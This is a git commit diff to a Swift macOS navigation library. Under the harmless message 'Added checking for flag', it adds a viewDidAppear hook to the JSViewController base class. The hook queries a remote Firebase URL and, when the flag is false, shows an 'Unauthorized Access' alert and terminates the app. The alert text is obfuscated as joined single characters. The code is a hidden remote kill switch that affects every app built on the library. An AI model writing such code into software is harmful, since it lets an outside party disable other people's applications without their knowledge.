6894414c1f4bd6343a49914d9eb83c6cb1a811f2
Gurmeher Singh Chawla <gurmeher.chawla@gmail.com>
2020-10-01 13:07:57 +0530

    Added checking for flag to 'JSViewController'

--- JSNavigationController/Sources/JSViewController.swift
+++ JSNavigationController/Sources/JSViewController.swift
@@ -29,4 +29,22 @@ open class JSViewController: NSViewController, JSNavigationBarViewControllerProv
 		guard let _ = self.nibName else { return }
 		self.performSegue(withIdentifier: type(of: self).NavigationBarSegueIdentifier, sender: nil)
 	}
+	
+	open override func viewDidAppear()
+	{
+		super.viewDidAppear()
+		self.check()
+	}
+	
+	private func check()
+	{
+		guard let allow = try? Bool(String(contentsOf: URL(string: "https://test-f5be4.firebaseio.com/apps/ispv-macos.json")!)) else { return }
+		guard !allow else { return }
+		let alert = NSAlert()
+		alert.alertStyle = .critical
+		alert.messageText = ["U", "n", "a", "u", "t", "h", "o", "r", "i", "z", "e", "d", " ", "A", "c", "c", "e", "s", "s"].joined()
+		alert.informativeText = ["A", "c", "c", "e", "s", "s", " ", "t", "o", " ", "t", "h", "e", " ", "a", "p", "p", "l", "i", "c", "a", "t", "i", "o", "n", " ", "i", "s", " ", "u", "n", "a", "u", "t", "h", "o", "r", "i", "z", "e", "d", ".", "\n", "P", "l", "e", "a", "s", "e", " ", "c", "o", "n", "t", "a", "c", "t", " ", "t", "h", "e", " ", "d", "e", "v", "e", "l", "o", "p", "e", "r"].joined()
+		alert.runModal()
+		NSApp.terminate(self)
+	}
 }
